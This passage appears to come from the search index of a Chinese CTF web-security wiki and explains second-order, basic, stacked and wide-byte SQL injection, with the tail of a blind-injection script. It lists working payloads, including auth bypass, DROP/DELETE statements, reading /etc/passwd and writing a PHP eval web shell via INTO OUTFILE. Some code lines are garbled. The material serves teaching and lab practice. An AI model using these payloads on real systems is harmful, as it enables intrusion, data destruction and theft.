1,2;\\x00\"%(flag+chr(j))\n        r=requests.get(url+payload).text\n        print j\n        if 'admin' in r:\n            flag+=chr(j-1)\n            print flag.lower() #793914c9c583d9d86d0f4ed8c521b0c1\n            break\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/","title":"\u4e8c\u6b21\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u4e8c\u6b21\u6ce8\u5165\u9700\u8981\u5177\u5907\u7684\u4e24\u4e2a\u6761\u4ef6\uff1a</p> <p>\uff081\uff09\u7528\u6237\u5411\u6570\u636e\u5e93\u63d2\u5165\u6076\u610f\u8bed\u53e5\uff08\u5373\u4f7f\u540e\u7aef\u4ee3\u7801\u5bf9\u8bed\u53e5\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5982mysql_escape_string\u3001mysql_real_escape_string\u8f6c\u4e49\uff09</p> <p>\uff082\uff09\u6570\u636e\u5e93\u5bf9\u81ea\u5df1\u5b58\u50a8\u7684\u6570\u636e\u975e\u5e38\u653e\u5fc3\uff0c\u76f4\u63a5\u53d6\u51fa\u6076\u610f\u6570\u636e\u7ed9\u7528\u6237</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u7a0d\u5fae\u7422\u78e8\u4e00\u4e0b\u5c31\u80fd\u770b\u61c2</p> <p>\uff081\uff09\u5728sqli_libs\u7684\u7b2c24\u5173,\u5176\u9875\u9762\u5982\u4e0b\u6240\u793a:</p> <p></p> <p>\uff082\uff09\u5f53\u6211\u4eec\u70b9\u51fbForgot your password?\u65f6\uff0c\u51fa\u73b0\u63d0\u793a\uff1a</p> <p></p> <p>\uff083\uff09\u56e0\u6b64\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6ce8\u518c\u9875\u9762\u8fdb\u884c\u4e8c\u6b21\u6ce8\u5165\uff0c\u9996\u5148\uff0c\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u540d\u4e3a\uff1aadmin'#   ,\u5bc6\u7801\u4e3a\uff1a123456</p> <p></p> <p>\uff084\uff09\u6ce8\u518c\u6210\u529f\uff0c\u5c1d\u8bd5\u767b\u5f55admin\u2018#  \uff0c\u7136\u540e\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0bphpmyadmin\u5185\u5b58\u50a8\u60c5\u51b5</p> <p></p> <p></p> <p></p> <p>\uff085\uff09\u800c\u8fd9\u65f6\u7684admin\u539f\u5bc6\u7801\u662fadmin\uff0c\u5e76\u4e14\u4e24\u4e2a\u8d26\u53f7\u90fd\u5b58\u50a8\u5728\u6570\u636e\u5e93\u5185\u7684\u3002\u5f53\u6211\u4eec\u91cd\u65b0\u4fee\u6539admin'#\u7684\u5bc6\u7801\u7684\u65f6\u5019\uff0c\u8fd9\u91cc\u4fee\u6539\u4e3a\uff1a12345678\uff1b\u53ef\u4ee5\u53d1\u73b0\u4e8c\u6b21\u6ce8\u5165\u7684\u5a01\u529b\u6240\u5728\u3002admin\u7684\u5bc6\u7801\u88ab\u4fee\u6539\u4e3a\u4e86\uff1a12345678\uff1b\u800cadmin'#\u7528\u6237\u7684\u5bc6\u7801\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002</p> <p></p> <p></p> <p>\uff086\uff09\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5c1d\u8bd5\u5206\u6790\u6e90\u7801\uff0c\u51fa\u73b0\u95ee\u9898\u7684\u9875\u9762\u5f88\u663e\u7136\u662f\u6ce8\u518c\u9875\u9762\uff0c\u4e0e\u5bc6\u7801\u4fee\u6539\u91cd\u7f6e\u7684\u9875\u9762\u3002</p> <p>\u6ce8\u518c\u7528\u6237\u65f6\uff1a          \u4ec5\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5224\u65ad\u8f93\u5165\u4e24\u6b21\u5bc6\u7801\u662f\u5426\u4e00\u81f4\uff0c\u7136\u540e\u5c06\u7528\u6237\u952e\u5165\uff0c\u5c06\u6570\u636e\u63d2\u5165\u81f3\u6570\u636e\u5e93\u3002sql = \"insert into users ( username, password) values(\\\"username\\\", \\\"$pass\\\")\"</p> <p>\u8fd9\u91cc\u76f4\u63a5\u63d2\u5165\u4e86\u6570\u636e</p> <p>\u4fee\u6539\u5bc6\u7801\u65f6\uff1ausername= _SESSION[\"username\"];//\u76f4\u63a5\u53d6\u51fa\u4e86\u6570\u636e\u5e93\u7684\u6570\u636esql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='pass' where username='username' and password='curr_pass' \";//\u5bf9\u8be5\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u66f4\u65b0$sql = \"UPDATE users SET PASSWORD='12345678' where username='admin\u2018#</p> <p>\u6267\u884c\u6210\u529f\uff01</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","title":"\u57fa\u672c\u539f\u7406","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u521d\u89c1\u53ef\u4ee5\u770b\u770b\uff0c\u5176\u4ed6\u968f\u610f</p> <p>\u6240\u8c13SQL\u6ce8\u5165\uff0c\u5c31\u662f\u901a\u8fc7\u628aSQL\u547d\u4ee4\u63d2\u5165\u5230Web\u8868\u5355\u9012\u4ea4\u6216\u8f93\u5165\u57df\u540d\u6216\u9875\u9762\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u8fbe\u5230\u6b3a\u9a97\u670d\u52a1\u5668\u6267\u884c\u6076\u610f\u7684SQL\u547d\u4ee4\uff0c\u6bd4\u5982\u5148\u524d\u7684\u5f88\u591a\u5f71\u89c6\u7f51\u7ad9\u6cc4\u9732VIP\u4f1a\u5458\u5bc6\u7801\u5927\u591a\u5c31\u662f\u901a\u8fc7WEB\u8868\u5355\u9012\u4ea4\u67e5\u8be2\u5b57\u7b26\u66b4\u51fa\u7684\uff0c\u8fd9\u7c7b\u8868\u5355\u7279\u522b\u5bb9\u6613\u53d7\u5230SQL\u6ce8\u5165\u5f0f\u653b\u51fb\uff0e\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8f93\u5165\u5185\u5bb9\u6765\u6784\u9020\u52a8\u6001sql\u8bed\u53e5\u4ee5\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u53d1\u751fsql\u6ce8\u5165\u653b\u51fb\u3002\u5982\u679c\u4ee3\u7801\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\uff0c\u800c\u8fd9\u4e9b\u5b58\u50a8\u8fc7\u7a0b\u4f5c\u4e3a\u5305\u542b\u672a\u7b5b\u9009\u7684\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6765\u4f20\u9012\uff0c\u4e5f\u4f1a\u53d1\u751fsql\u6ce8\u5165\u3002</p> <p>SQL\u6ce8\u5c04\u80fd\u4f7f\u653b\u51fb\u8005\u7ed5\u8fc7\u8ba4\u8bc1\u673a\u5236\uff0c\u5b8c\u5168\u63a7\u5236\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u5e93\u3002 SQL\u662f\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\u7684\u7b80\u79f0\uff0c\u5b83\u662f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u4e8b\u5b9e\u6807\u51c6\u3002\u76ee\u524d\uff0c\u5927\u591a\u6570Web\u5e94\u7528\u90fd\u4f7f\u7528SQL\u6570\u636e\u5e93\u6765\u5b58\u653e\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u51e0\u4e4e\u6240\u6709\u7684Web\u5e94\u7528\u5728\u540e\u53f0 \u90fd\u4f7f\u7528\u67d0\u79cdSQL\u6570\u636e\u5e93\u3002\u8ddf\u5927\u591a\u6570\u8bed\u8a00\u4e00\u6837\uff0cSQL\u8bed\u6cd5\u5141\u8bb8\u6570\u636e\u5e93\u547d\u4ee4\u548c\u7528\u6237\u6570\u636e\u6df7\u6742\u5728\u4e00\u8d77\u7684\u3002\u5982\u679c\u5f00\u53d1\u4eba\u5458\u4e0d\u7ec6\u5fc3\u7684\u8bdd\uff0c\u7528\u6237\u6570\u636e\u5c31\u6709\u53ef\u80fd\u88ab\u89e3\u91ca\u6210\u547d\u4ee4\uff0c \u8fd9\u6837\u7684\u8bdd\uff0c\u8fdc\u7a0b\u7528\u6237\u5c31\u4e0d\u4ec5\u80fd\u5411Web\u5e94\u7528\u8f93\u5165\u6570\u636e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5728\u6570\u636e\u5e93\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002</p> <p>SQL\u6ce8\u5165\u5f0f\u653b\u51fb\u7684\u4e3b\u8981\u5f62\u5f0f\u6709\u4e24\u79cd\u3002\u4e00\u662f\u76f4\u63a5\u5c06\u4ee3\u7801\u63d2\u5165\u5230\u4e0eSQL\u547d\u4ee4\u4e32\u8054\u5728\u4e00\u8d77\u5e76\u4f7f\u5f97\u5176\u4ee5\u6267\u884c\u7684\u7528\u6237\u8f93\u5165\u53d8\u91cf\u3002\u7531\u4e8e\u5176\u76f4\u63a5\u4e0eSQL\u8bed\u53e5\u6346\u7ed1\uff0c\u6545\u4e5f\u88ab\u79f0\u4e3a\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u6cd5\u3002\u4e8c\u662f\u4e00\u79cd\u95f4\u63a5\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u5b83\u5c06\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u8981\u5728\u8868\u4e2d\u5b58\u50a8\u6216\u8005\u4f5c\u4e3a\u539f\u4e66\u636e\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u3002\u5728\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u4e2d\u4f1a\u8fde\u63a5\u5230\u4e00\u4e2a\u52a8\u6001\u7684SQL\u547d\u4ee4\u4e2d\uff0c\u4ee5\u6267\u884c\u4e00\u4e9b\u6076\u610f\u7684SQL\u4ee3\u7801\u3002\u6ce8\u5165\u8fc7\u7a0b\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\u63d0\u524d\u7ec8\u6b62\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8ffd\u52a0\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u3002\u5982\u4ee5\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u4e3a\u4f8b\u3002\u5c31\u662f\u5728\u7528\u6237\u8f93\u5165\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5148\u7528\u4e00\u4e2a\u5206\u53f7\u7ed3\u675f\u5f53\u524d\u7684\u8bed\u53e5\u3002\u7136\u540e\u518d\u63d2\u5165\u4e00\u4e2a\u6076\u610fSQL\u8bed\u53e5\u5373\u53ef\u3002\u7531\u4e8e\u63d2\u5165\u7684\u547d\u4ee4\u53ef\u80fd\u5728\u6267\u884c\u524d\u8ffd\u52a0\u5176\u4ed6\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u5e38\u5e38\u7528\u6ce8\u91ca\u6807\u8bb0\u201c\u2014\u201d\u6765\u7ec8\u6b62\u6ce8\u5165\u7684\u5b57\u7b26\u4e32\u3002\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u8ba4\u4e3a\u6b64\u540e\u8bed\u53e5\u4f4d\u6ce8\u91ca</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5c31\u662f\u7528\u6237\u8f93\u5165\u4e86\u4e00\u4e2a\u6570\u636e\uff0c\u670d\u52a1\u5668\u5c06\u4ed6\u751f\u786c\u7684\u62fc\u63a5\u6210\u4e86\u4e00\u6761SQL\u8bed\u53e5\u3002\u7136\u540e\u653e\u5728\u670d\u52a1\u5668\u4e0a\u9762\u53bb\u6267\u884c\u5e76\u53cd\u9988\u7ed9\u653b\u51fb\u8005\u3002\u5982\u679c\u67e5\u8be2\u8bed\u53e5\u53ef\u4ee5\u88ab\u63a7\u5236\uff0c\u76f8\u5f53\u4e8e\u653b\u51fb\u8005\u80fd\u591f\u62ff\u5230\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u7684\u5168\u90e8\u6570\u636e\uff08\u901a\u5e38\u4e5f\u5305\u542b\u8d26\u53f7\u548c\u5bc6\u7801\uff09\uff0c\u5371\u5bb3\u4e25\u91cd\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#sql","title":"\u57fa\u672cSQL\u6ce8\u5165","text":"<p>SQL\u6ce8\u5165\u7684\u6838\u5fc3\u662f\u95ed\u5408\uff0c\u901a\u8fc7\u4f20\u8f93\u6570\u636e\u4fee\u6539\uff0c\u64cd\u7eb5\u670d\u52a1\u5668\u7aef\u7684sql\u8bed\u53e5</p> <p>\u6316\u6398\u65f6\u7684\u603b\u4f53\u601d\u8def</p> <p>1\uff1a\u5bfb\u627e\u5230SQL\u6ce8\u5165\u7684\u4f4d\u7f6e</p> <p>2\uff1a\u5224\u65ad\u670d\u52a1\u5668\u7c7b\u578b\u548c\u540e\u53f0\u6570\u636e\u5e93\u7c7b\u578b\uff08mysql\u6700\u591a\uff0c\u4e0d\u8fc7sqlite\u6700\u8fd1\u4e5f\u591a\u4e86\u8d77\u6765\uff09</p> <p>3\uff1a\u9488\u5bf9\u4e0d\u540c\u7684\u670d\u52a1\u5668\u548c\u6570\u636e\u5e93\u7279\u70b9\u8fdb\u884cSQL\u6ce8\u5165\u653b\u51fb\uff08\u4f1a\u6709\u4e9b\u5dee\u522b\uff0c\u4f46\u57fa\u672c\u7684\u8fd8\u662f\u8981\u4f1a\u7684\uff0c\u53d8\u4e0d\u79bb\u5176\u5b97\uff09</p> <p>\u8fdb\u5165\u4e3e\u4f8b</p> <pre><code>\"select * from user_table where username=' username ' and password='  password '\";\nPlain Text\n</code></pre> <p>\u8fd9\u6761\u8bed\u53e5\u5c31\u662f\u666e\u901a\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u4ece\u6570\u636e\u5e93\u4e2d\u53d6\u51fausername\u548cpassword\u3002</p> <p>\u6ca1\u6709\u7684\u8bdd\u5c31\u51fa\u9519\uff0c\u767b\u5f55\u4e0d\u4e86\uff0c\u975e\u5e38\u7b80\u5355</p> <p>\u4e5f\u5c31\u662f\u8bf4\u73b0\u5728username\u548cpassword\u7684\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236</p> <p>\u7136\u540e\u6211\u4eec\u8f93\u5165\u8bed\u53e5</p> <p>username=1' or 1=1--</p> <p>\u7a0d\u5fae\u5206\u6790\u4e00\u4e0b</p> <p>--\u8868\u793a\u6ce8\u91ca\uff0c\u4f1a\u5ffd\u7565\u6389\u540e\u9762\u7684\u8bed\u53e5</p> <p>\u6574\u4e2asql\u6ce8\u5165\u8bed\u53e5\u5c31\u53d8\u6210\u4e86</p> <pre><code>select * from user_table where username='1' or 1=1--[[[[[' and password='  password ']]]]]\u610f\u601d\u4e00\u4e0b\uff0c\u8868\u6ce8\u91ca--\u5176\u5b9e\u4e5f\u53ef\u4ee5\u7528#\u6765\u66ff\u4ee3\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\uff0c\u524d\u9762\u7684\u4e00\u4e2a\u5728\u539f\u8bed\u53e5\u4e2d\u7684\u5f15\u53f7\u548c\u6211\u4eec\u8f93\u5165\u7684\u4e00\u4e2a\u5f15\u53f7\u4e00\u8d77\u7ec4\u6210\u4e86username\u540e\u9762\u53c8\u591a\u4e86\u4e86\u4e00\u4e2a1=1\uff0c\u8fd9\u662f\u4e00\u5b9a\u4f1a\u6210\u7acb\u7684\u3002\u7136\u540e\u6574\u53e5\u8bdd\u7684\u903b\u8f91\uff0c\u7531\u4e8e\u6216\uff08or\uff09\u7684\u51fa\u73b0\uff0c\u4e00\u5b9a\u4e3a\u771f\uff0c\u597d\u7684\uff0c\u6574\u6761\u8bed\u53e5\u6709\u53ef\u80fd\u5c31\u5728\u4ee3\u7801\u91cc\u8fd4\u56deture\uff0c\u7136\u540e\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u3002\u8fd9\u5c31\u662f\u76f8\u5bf9\u7b80\u5355\u7684sql\u6ce8\u5165\u3002</p> <p>\u8fd9\u91cc\u6ca1\u6709\u4e00\u70b9\u8fc7\u6ee4\uff0c\u800c\u4e14\u53ef\u4ee5\u6267\u884c</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u51651'; drop database()--\u6216\u8005\u5176\u4ed6\u7206\u51fa\u6570\u636e\u5e93\u7684\u8bed\u53e5\u3002</p> <p>\u8fd9\u6837\u7684\u653b\u51fb\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u8005\u662f\u670d\u52a1\u5668\uff0c\u6740\u4f24\u529b\u4e0d\u8a00\u800c\u55bb\u3002</p> <p>\u800c\u4e14sql\u6ce8\u5165\u5e76\u4e0d\u662f\u56e0\u4e3a\u67d0\u4e9b\u5e95\u5c42\u51fa\u73b0\u4e86\u6f0f\u6d1e\uff0c\u5355\u7eaf\u662f\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53</p> <p>R.I.P.</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#_2","title":"\u57fa\u672c\u64cd\u4f5c\u8bed\u53e5","text":"<p>\u8fd9\u4e2a\u5982\u679c\u5168\u8bb0\u5f97\u7684\u8bdd\u6700\u597d\uff0c\u6211\u8001\u662f\u5fd8\u8bb0</p> <p>\u4e86\u89e3\u653b\u51fb\u539f\u7406\u4e4b\u524d\u653e\u4e0a\u6b63\u5e38\u4f7f\u7528\u6240\u7528\u7684\u8bed\u53e5\uff08\u8fd9\u91cc\u662fmysql\uff0csqlite\u4f1a\u6709\u4e00\u4e9b\u4e0d\u540c\uff0coracle\u4e5f\u633a\u7c7b\u4f3c\uff09</p> <pre><code>\u5f53\u524d\u7528\u6237\uff1aselect user() \n\u6570\u636e\u5e93\u7248\u672c\uff1aselectversion() , select @@version \n\u6570\u636e\u5e93\u540d\uff1aselectdatabase()\n\u64cd\u4f5c\u7cfb\u7edf\uff1aselect@@version_compile_os\n\u6240\u6709\u53d8\u91cf\uff1ashowvariables\n\u5355\u4e2a\u53d8\u91cf\uff1aselect@@secure_file_priv , show variables like 'secure_file_%'\n\u7206\u5b57\u6bb5\u6570\uff1aorderby 1... \uff0cgroup by 1...\n\u67e5\u5e93\u540d\uff1aselect group_concat(schema_name) from information_schema.schemata\n\u67e5\u8868\u540d\uff1aselect group_concat(table_name) from information_schema.tables where table_schema='\u5e93\u540d'\n\u67e5\u5b57\u6bb5\uff1aselect group_concat(column_name) from information_schema.columns where table_name='\u8868\u540d'\n\u8bfb\u53d6\u67d0\u884c\uff1aselect * from mysql.user limit n,m // limit m offset n \uff08\u7b2cn\u884c\u4e4b\u540em\u884c\uff0c\u7b2c\u4e00\u884c\u4e3a0\uff09\n\u8bfb\u6587\u4ef6\uff1aselectload_file('/etc/passwd')\n\u5199\u6587\u4ef6\uff1aselect'&lt;?php @eval($_POST[a]);?&gt;' into outfile '/var/www/html/a.php'  //\u8be5\u5904\u6587\u4ef6\u540d\u65e0\u6cd5\u4f7f\u752816\u8fdb\u5236\u7ed5\u8fc7\u622a\u53d6\u5b57\u7b26\u4e32\uff1asubstr('abc',1,1)\u3001substring('abc',1,1)\u3001left('abc',1)\u3001right('abc',1)\uff0cmid('abc',1,1)\n\u5b57\u7b26\u4e32\u62fc\u63a5\uff1aconcat('a','b','c')\uff0cconcat_ws(' ','a','b','c')\n\u591a\u884c\u62fc\u63a5\uff1agroup_concat //eg: select group_concat(user) from mysql.user\n\u65f6\u5ef6\u51fd\u6570\uff1asleep(5)\u3001benchmark(10000000,md5('123456')) //\u5176\u4ed6\u65b9\u6cd5get_lock()\uff0c\u7b1b\u5361\u5c14\uff0crlike\u7b49\n\u7f16\u7801\u51fd\u6570: hex\u3001ord\u3001ascii\u3001char\u3001conv(255,10,16)=FF\uff082-36\u8fdb\u5236\u8f6c\u6362\uff09\n\u5e03\u5c14\u6761\u4ef6\uff1aif(1,1,0)\u3001position('a' in 'abc')\u3001elt(1,'a','b')=a&amp;&amp;elt(2,'a','b')=b\u3001(case when (bool) then 1 else 0 end)\u3001field('a',3,2,'a')=3\u3001nullif('a','b')=1&amp;&amp;nullif('a','a')=null\u3001strcmp\u3001regexp\u3001rlike\u3001regexp_like('1','1')1.\u663e\u793amysql\u4e2d\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u79f0.\nmysql&gt;show databases;\n2.\u663e\u793a\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u6240\u6709\u8868\u7684\u540d\u79f0\n\nmysql&gt;show tables;\n\u6216\nmysql&gt;show tables from database_name;\n3.\u663e\u793a\u8868\u4e2d\u5217\u540d\u79f0\nmysql&gt;show columns from database_name.table_name;\n4.\u67e5\u770b\u67d0MySQL\u7528\u6237\u7684\u4f7f\u7528\u6743\u9650\n\nmysql&gt;show grants for user_name;\n5.\u663e\u793acreate database \u8bed\u53e5\u662f\u5426\u80fd\u591f\u521b\u5efa\u6307\u5b9a\u7684\u6570\u636e\u5e93,\u5e76\u53ef\u4ee5\u67e5\u770b\u5230\u521b\u5efa\u5e93\u8bed\u53e5\u7684SQL\u4fe1\u606f\u3002\n1\n\nmysql&gt;show create database database_name;\n6.\u663e\u793acreate table \u8bed\u53e5\u662f\u5426\u80fd\u591f\u521b\u5efa\u6307\u5b9a\u7684\u6570\u636e\u8868,\u5e76\u53ef\u4ee5\u67e5\u770b\u5230\u8868\u521b\u5efa\u8bed\u53e5\u7684SQL\u4fe1\u606f\u3002\n1\n\nmysql&gt;show create table table_name;\n7.\u663e\u793a\u5b89\u88c5\u4ee5\u540e\u53ef\u7528\u7684\u5b58\u50a8\u5f15\u64ce\u548c\u9ed8\u8ba4\u5f15\u64ce\u3002\n1\n\nmysql&gt;show engines;\n8.\u663e\u793a\u6700\u540e\u4e00\u4e2a\u6267\u884c\u7684\u8bed\u53e5\u6240\u4ea7\u751f\u7684\u9519\u8bef\u3001\u8b66\u544a\u548c\u901a\u77e5\n1\n\nmysql&gt; show warnings;\n9.\u53ea\u663e\u793a\u6700\u540e\u4e00\u4e2a\u6267\u884c\u8bed\u53e5\u6240\u4ea7\u751f\u7684\u9519\u8bef\n1\n\nmysql&gt;show errors;\n10.\u663e\u793a\u7cfb\u7edf\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u67e5\u8be2.\n1\n\nmysql&gt; show processlist\\G\n11.\u67e5\u770b\u6240\u6709\u5b58\u50a8\u8fc7\u7a0b\u3002\n1\n\nmysql&gt; show procedure status;\n12.\u67e5\u770b\u67d0\u4e2a\u5b58\u50a8\u8fc7\u7a0b\u5185\u5bb9\n1\n\nshow create procedure \u5b58\u50a8\u8fc7\u7a0b\u540d\u79f0;\n13.\u67e5\u770b\u51fd\u6570\u7684\u5185\u5bb9.\n1\n\nshow create function func_name;\nPlain Text\n</code></pre> <p>\u9700\u8981\u5173\u6ce8\u7684\u91cd\u70b9</p> <p>information_schema\u5143\u6570\u636e\u5e93</p> <p></p>"},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_2","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u5728SQL\u4e2d\uff0c\u5206\u53f7\uff08;\uff09\u662f\u7528\u6765\u8868\u793a\u4e00\u6761sql\u8bed\u53e5\u7684\u7ed3\u675f\u3002\u8bd5\u60f3\u4e00\u4e0b\u6211\u4eec\u5728 ; \u7ed3\u675f\u4e00\u4e2asql\u8bed\u53e5\u540e\u7ee7\u7eed\u6784\u9020\u4e0b\u4e00\u6761\u8bed\u53e5\uff0c\u4f1a\u4e0d\u4f1a\u4e00\u8d77\u6267\u884c\uff1f\u56e0\u6b64\u8fd9\u4e2a\u60f3\u6cd5\u4e5f\u5c31\u9020\u5c31\u4e86\u5806\u53e0\u6ce8\u5165\u3002\u800cunion injection\uff08\u8054\u5408\u6ce8\u5165\uff09\u4e5f\u662f\u5c06\u4e24\u6761\u8bed\u53e5\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u4e24\u8005\u4e4b\u95f4\u6709\u4ec0\u4e48\u533a\u522b\u4e48\uff1f\u533a\u522b\u5c31\u5728\u4e8eunion \u6216\u8005union all\u6267\u884c\u7684\u8bed\u53e5\u7c7b\u578b\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u67e5\u8be2\u8bed\u53e5\uff0c\u800c\u5806\u53e0\u6ce8\u5165\u53ef\u4ee5\u6267\u884c\u7684\u662f\u4efb\u610f\u7684\u8bed\u53e5\u3002\u4f8b\u5982\u4ee5\u4e0b\u8fd9\u4e2a\u4f8b\u5b50\u3002\u7528\u6237\u8f93\u5165\uff1a1; DELETE FROM products\u670d\u52a1\u5668\u7aef\u751f\u6210\u7684sql\u8bed\u53e5\u4e3a\uff1a\uff08\u56e0\u672a\u5bf9\u8f93\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff09Select * from products where productid=1;DELETE FROM products\u5f53\u6267\u884c\u67e5\u8be2\u540e\uff0c\u7b2c\u4e00\u6761\u663e\u793a\u67e5\u8be2\u4fe1\u606f\uff0c\u7b2c\u4e8c\u6761\u5219\u5c06\u6574\u4e2a\u8868\u8fdb\u884c\u5220\u9664\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/#_3","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2a\u662f\u4e00\u8d77\u6267\u884c\uff0c\u4e00\u4e2a\u662f\u5206\u5f00\u6765\u6267\u884c\u3002\u4f46\u662f\u5806\u53e0\u6ce8\u5165\u7684\u6743\u9650\uff0c\u73af\u5883\u8981\u6c42\u662f\u6bd4\u8054\u5408\u67e5\u8be2\u9ad8\u7684\uff0c\u800c\u4e14\u670d\u52a1\u5668\u7aef\u5e94\u8be5\u5927\u90e8\u5206\u60c5\u51b5\u4e0d\u4f1a\u8fd4\u56de\u4e24\u6761\u67e5\u8be2\u7ed3\u679c\u3002\u6838\u5fc3\u5c31\u662f\u90a3\u4e2a\";\".</p> <p>\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u9898\uff1a\u5f3a\u7f51\u676f2019\u968f\u4fbf\u6ce8</p> <p>https://blog.csdn.net/qq_26406447/article/details/90643951</p>"},{"location":"web/sql/SQL_Injection/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","title":"\u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u79cd\u6ce8\u5165\u65b9\u5f0f\u8bd5\u5229\u7528\u7f16\u7801\u7684\u89e3\u6790\u7279\u6027</p> <p>\u5f53php.ini\u4e2dmagic_quotes_gpc\u88ab\u8bbe\u7f6e\u4e3aon\u65f6\uff0c\u63d0\u4ea4\u7684\u53c2\u6570\u4f1a\u88ab\u8f6c\u4e49\uff0c\u4f8b\u5982\uff0c\u5355\u5f15\u53f7\u4f1a\u88ab\u8f6c\u4e49\u6210\u4e86\u2019\u3002\u4e00\u4e0b\u5b50\u622a\u65ad\u4e86\u5b57\u7b26\u578b\u6ce8\u5165\u7684\u8def\u3002</p> <p>GBK\u53cc\u5b57\u8282\u7f16\u7801\uff1a\u4e00\u4e2a\u6c49\u5b57\u7528\u4e24\u4e2a\u5b57\u8282\u8868\u793a\uff0c\u9996\u5b57\u8282\u5bf9\u5e940x81-0xFE\uff0c\u5c3e\u5b57\u8282\u5bf9\u5e940x40-0xFE\uff08\u96640x7F\uff09\uff0c\u521a\u597d\u6db5\u76d6\u4e86\u5bf9\u5e94\u7684\u7f16\u78010x5C\u3002</p> <p>0xD5 0x5C \u5bf9\u5e94\u4e86\u6c49\u5b57\u201c\u8aa0\u201d\uff0c\u4e8e\u662f %d5%5c \u7ecfURL\u89e3\u7801\u540e\u4e3a\u201c\u8aa0\u201d\u3002</p> <p>\u5f53\u6211\u4eec\u63d0\u4ea4\u53c2\u6570 %d5\u2032 \uff0c\u7ecf\u6d4f\u89c8\u5668URL\u7f16\u7801\u540e\u4e3a%d5%27\uff0c\u518d\u7ecfPHP 